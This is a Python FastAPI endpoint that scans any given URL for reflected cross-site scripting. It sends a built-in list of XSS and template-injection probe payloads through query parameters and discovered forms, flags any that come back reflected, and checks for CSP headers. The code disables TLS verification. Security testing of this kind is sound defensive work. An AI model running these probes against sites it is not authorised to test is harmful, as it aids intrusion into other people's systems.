from fastapi import APIRouter
import requests
import urllib3
urllib3.disable_warnings()

router = APIRouter()

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><svg onload=alert(1)>',
    'javascript:alert(1)',
    '<body onload=alert(1)>',
    '{{7*7}}',
    '${7*7}',
]

def get_forms(url, session):
    from html.parser import HTMLParser
    class FormParser(HTMLParser):
        def __init__(self):
            super().__init__()
            self.forms = []
            self.current_form = None
            self.inputs = []
        def handle_starttag(self, tag, attrs):
            attrs = dict(attrs)
            if tag == 'form':
                self.current_form = attrs
                self.inputs = []
            elif tag == 'input' and self.current_form is not None:
                self.inputs.append(attrs)
        def handle_endtag(self, tag):
            if tag == 'form' and self.current_form is not None:
                self.forms.append({'form': self.current_form, 'inputs': self.inputs})
                self.current_form = None
    try:
        res = session.get(url, timeout=10, verify=False)
        parser = FormParser()
        parser.feed(res.text)
        return parser.forms, res
    except:
        return [], None

@router.get("/")
def xss_scan(target: str):
    try:
        url = target if target.startswith("http") else f"https://{target}"
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0'})

        findings = []
        tested = 0

        forms, page_res = get_forms(url, session)

        # Test URL params with payloads
        for payload in XSS_PAYLOADS[:6]:
            try:
                test_url = f"{url}?q={requests.utils.quote(payload)}&search={requests.utils.quote(payload)}"
                res = session.get(test_url, timeout=8, verify=False)
                if payload.lower() in res.text.lower():
                    findings.append({
                        'type': 'Reflected XSS',
                        'location': 'URL parameter',
                        'payload': payload,
                        'severity': 'HIGH',
                        'url': test_url,
                    })
                tested += 1
            except:
                pass

        # Test forms
        for form_data in forms[:3]:
            form   = form_data['form']
            inputs = form_data['inputs']
            action = form.get('action', url)
            method = form.get('method', 'get').lower()
            if not action.startswith('http'):
                from urllib.parse import urljoin
                action = urljoin(url, action)

            for payload in XSS_PAYLOADS[:4]:
                try:
                    data = {}
                    for inp in inputs:
                        name = inp.get('name', '')
                        if name:
                            data[name] = payload
                    if method == 'post':
                        res = session.post(action, data=data, timeout=8, verify=False)
                    else:
                        res = session.get(action, params=data, timeout=8, verify=False)
                    if payload.lower() in res.text.lower():
                        findings.append({
                            'type': 'Reflected XSS',
                            'location': f'Form ({method.upper()})',
                            'payload': payload,
                            'severity': 'HIGH',
                            'action': action,
                        })
                    tested += 1
                except:
                    pass

        # Check security headers
        headers_checked = {}
        if page_res:
            csp = page_res.headers.get('Content-Security-Policy', '')
            xss_prot = page_res.headers.get('X-XSS-Protection', '')
            headers_checked = {
                'CSP': csp or 'Missing ⚠',
                'X-XSS-Protection': xss_prot or 'Missing ⚠',
            }

        return {
            'status': 'success',
            'target': target,
            'vulnerable': len(findings) > 0,
            'findings': findings,
            'forms_found': len(forms),
            'payloads_tested': tested,
            'security_headers': headers_checked,
            'risk_level': 'HIGH' if findings else 'LOW',
        }

    except Exception as e:
        return {'status': 'error', 'message': str(e)}
